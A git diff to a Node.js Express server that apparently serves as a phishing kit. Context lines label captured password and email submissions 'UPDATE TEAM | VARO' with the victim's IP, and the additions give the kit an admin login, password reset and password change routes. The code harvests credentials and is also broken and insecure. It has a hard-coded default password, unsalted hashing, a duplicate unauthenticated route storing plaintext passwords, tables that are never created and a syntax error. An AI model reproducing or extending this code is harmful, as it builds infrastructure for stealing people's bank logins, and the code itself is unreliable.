@@ -3,6 +3,7 @@ const bodyParser = require('body-parser');
 const sqlite3 = require('sqlite3').verbose();
 const axios = require('axios');
 const { sendMessageFor } = require('simple-telegram-message');
+const crypto = require('crypto');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -19,10 +20,34 @@ app.use(bodyParser.json());
 // Initialize SQLite database
 const db = new sqlite3.Database(':memory:');
 
+// Insert default admin credentials
+const defaultUsername = 'admin';
+const defaultPassword = 'updateteam'; // Remember to hash passwords for security
+const hashedPassword = crypto.createHash('sha256').update(defaultPassword).digest('hex');
+
 db.serialize(() => {
-  db.run("CREATE TABLE clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT)");
-  db.run("CREATE TABLE stats (id INTEGER PRIMARY KEY, stats_json TEXT)");
+    db.run("CREATE TABLE IF NOT EXISTS admin (username TEXT PRIMARY KEY, password TEXT)");
+
+    db.get("SELECT * FROM admin WHERE username = ?", [defaultUsername], (err, row) => {
+        if (err) {
+            console.error(`Error checking admin: ${err.message}`);
+            return;
+        }
+        if (!row) {
+            // Insert default admin credentials if they don't already exist
+            db.run("INSERT INTO admin (username, password) VALUES (?, ?)", [defaultUsername, hashedPassword], (err) => {
+                if (err) {
+                    console.error(`Error inserting default admin credentials: ${err.message}`);
+                } else {
+                    console.log('Default admin credentials inserted successfully');
+                }
+            });
+        } else {
+            console.log('Default admin credentials already exist');
+        }
+    });
 });
+
 
 let visitors = 0;
 let humans = 0;
@@ -33,6 +58,8 @@ let clients = {};
 function resetVisits(){
     visitors = 0;
 }
+
+
 
 function addClientToDatabase(clientId, ip) {
     visitors++;
@@ -101,6 +128,43 @@ function broadcastAdminPanel(currPage, stats) {
     });
 }
 
+app.get('/reset-password-form', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'reset-password.html'));
+});
+
+app.post('/reset-password', (req, res) => {
+    const { apiKey, username, newPassword } = req.body;
+    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');
+
+    db.get("SELECT * FROM api_keys WHERE key = ?", [apiKey], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving API key: ${err.message}`);
+            return res.status(500).send('Error verifying API key');
+        }
+        if (row) {
+            db.get("SELECT * FROM admin WHERE username = ?", [username], (err, row) => {
+                if (err) {
+                    console.error(`Error retrieving admin: ${err.message}`);
+                    return res.status(500).send('Error retrieving admin');
+                }
+                if (row) {
+                    db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
+                        if (err) {
+                            console.error(`Error updating password: ${err.message}`);
+                            return res.status(500).send('Error updating password');
+                        }
+                        res.send('Password reset successfully');
+                    });
+                } else {
+                    res.status(404).send('User not found');
+                }
+            });
+        } else {
+            res.status(401).send('Unauthorized: Invalid API key');
+        }
+    });
+});
+
 function getClientIp(req) {
     const xForwardedFor = req.headers['x-forwarded-for'];
     if (xForwardedFor) {
@@ -134,6 +198,8 @@ const handleRequest = async (req, res) => {
     const myObjects = Object.keys(req.body);
     const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
+    console.log(lowerCaseMyObjects);
+    
     if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
         message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
             `👤 LOGIN \n\n`;
@@ -306,6 +372,100 @@ app.post('/process-request', async (req, res) => {
         console.error(`Error processing request: ${error.message}`);
         res.sendStatus(500);
     }
+});
+
+
+// Route to serve the login HTML file
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+// Route to handle the login form submission
+app.post('/admin-login', (req, res) => {
+    const { username, password } = req.body;
+    const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
+
+    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedPassword], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving admin: ${err.message}`);
+            return res.status(500).send('Error retrieving admin');
+        }
+        if (row) {
+            // Read the contents of a file and send it as the response
+            fs.readFile(path.join(__dirname, .., 'public', 'admin.html'), 'utf8', (err, data) => {
+                if (err) {
+                    console.error(`Error reading file: ${err.message}`);
+                    return res.status(500).send('Error reading file');
+                }
+                res.send(data);
+            });
+        } else {
+            res.status(401).send('Unauthorized: Invalid username or password');
+        }
+    });
+});
+
+// Route to change the admin password
+app.post('/change-password', (req, res) => {
+    const { username, oldPassword, newPassword } = req.body;
+    const hashedOldPassword = crypto.createHash('sha256').update(oldPassword).digest('hex');
+    const hashedNewPassword = crypto.createHash('sha256').update(newPassword).digest('hex');
+
+    db.get("SELECT * FROM admin WHERE username = ? AND password = ?", [username, hashedOldPassword], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving admin: ${err.message}`);
+            return res.status(500).send('Error retrieving admin');
+        }
+        if (row) {
+            db.run("UPDATE admin SET password = ? WHERE username = ?", [hashedNewPassword, username], (err) => {
+                if (err) {
+                    console.error(`Error updating password: ${err.message}`);
+                    return res.status(500).send('Error updating password');
+                }
+                res.send('Password changed successfully');
+            });
+        } else {
+            res.status(401).send('Unauthorized: Invalid username or old password');
+        }
+    });
+});
+
+const apiKeys = new Set(['your_api_key']);
+
+
+// Endpoint to confirm API key
+app.post('/confirm-api', (req, res) => {
+    const { apiKey } = req.body;
+    if (apiKeys.has(apiKey)) {
+        res.json({ success: true });
+    } else {
+        res.status(401).json({ success: false, message: 'Invalid API key' });
+    }
+});
+
+app.post('/change-password', (req, res) => {
+    const { username, newPassword } = req.body;
+
+    // Check if the user exists in the database
+    db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
+        if (err) {
+            console.error(`Error retrieving user: ${err.message}`);
+            return res.status(500).json({ success: false, message: 'Internal server error' });
+        }
+        
+        if (!row) {
+            return res.status(404).json({ success: false, message: 'User not found' });
+        }
+
+        // Update the password in the database
+        db.run("UPDATE users SET password = ? WHERE username = ?", [newPassword, username], (err) => {
+            if (err) {
+                console.error(`Error updating password: ${err.message}`);
+                return res.status(500).json({ success: false, message: 'Internal server error' });
+            }
+            res.json({ success: true, message: 'Password changed successfully' });
+        });
+    });
 });
 
 app.listen(port, () => {
